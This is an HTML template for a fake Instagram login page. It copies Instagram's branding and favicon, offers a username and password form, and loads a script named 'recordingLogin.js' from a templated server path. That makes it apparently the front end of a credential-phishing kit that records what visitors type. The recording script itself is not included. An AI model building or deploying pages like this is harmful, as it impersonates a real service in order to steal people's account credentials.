<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrG_0P3_l.png" type="image/x-icon">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap'); /* For a more Instagram-like logo font */

        :root {
            --ig-blue: #0095f6;
            --ig-dark-bg: #000;
            --ig-card-bg: #1a1a1a;
            --ig-border: #363636;
            --ig-text-light: #f5f5f5;
            --ig-text-grey: #a8a8a8;
            --ig-input-bg: #262626;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--ig-dark-bg);
            color: var(--ig-text-light);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 100%;
            max-width: 350px;
        }

        .login-card, .signup-card {
            background-color: var(--ig-card-bg);
            border: 1px solid var(--ig-border);
            border-radius: 8px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 52px;
            margin-bottom: 25px;
            color: var(--ig-text-light);
            font-weight: normal;
        }

        #login-form {
            display: flex;
            flex-direction: column;
            width: 100%;
            gap: 8px;
            margin-bottom: 15px;
        }

        #login-form input {
            background-color: var(--ig-input-bg);
            border: 1px solid var(--ig-border);
            border-radius: 4px;
            padding: 12px 10px;
            color: var(--ig-text-light);
            font-size: 14px;
            width: 100%;
        }

        #login-form input::placeholder {
            color: var(--ig-text-grey);
        }

        #login-form input:focus {
            outline: none;
            border-color: var(--ig-text-grey);
        }

        .login-button {
            background-color: var(--ig-blue);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px 0;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 100%;
            margin-top: 8px;
        }

        .login-button:hover {
            background-color: #0077e6;
        }

        .or-separator {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0;
        }

        .or-separator .line {
            flex-grow: 1;
            height: 1px;
            background-color: var(--ig-border);
        }

        .or-separator span {
            padding: 0 18px;
            color: var(--ig-text-grey);
            font-size: 13px;
            font-weight: bold;
        }

        .facebook-login {
            background: none;
            border: none;
            color: var(--ig-blue);
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .facebook-login svg {
            fill: var(--ig-blue);
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            color: var(--ig-blue);
            font-size: 12px;
            text-decoration: none;
            margin-top: 0px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-card p {
            color: var(--ig-text-light);
            font-size: 14px;
        }

        .signup-card a {
            color: var(--ig-blue);
            text-decoration: none;
            font-weight: bold;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <h1 class="logo">Instagram</h1>
            <form id="login-form">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" data-role="login-input" required>
                <input type="password" id="password" name="password" placeholder="Password" data-role="login-input" required>
                <button type="submit" class="login-button">Log In</button>
            </form>
            <div class="or-separator">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>
            <button class="facebook-login">
                <svg viewBox="0 0 24 24">
                    <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.25 6 14 6c1.24 0 2.43.09 2.43.09v2.75H14.13c-1.38 0-1.88.87-1.88 1.74V12h3.08l-.49 3h-2.59v6.8c4.56-.93 8-4.96 8-9.8z"></path>
                </svg>
                Log in with Facebook
            </button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-card">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
      const API_BASE_PATH = "{{ api_base_path }}";
    </script>
    <script src="{{ url_for('static', path='js/recordingLogin.js') }}"></script>
</body>
</html>
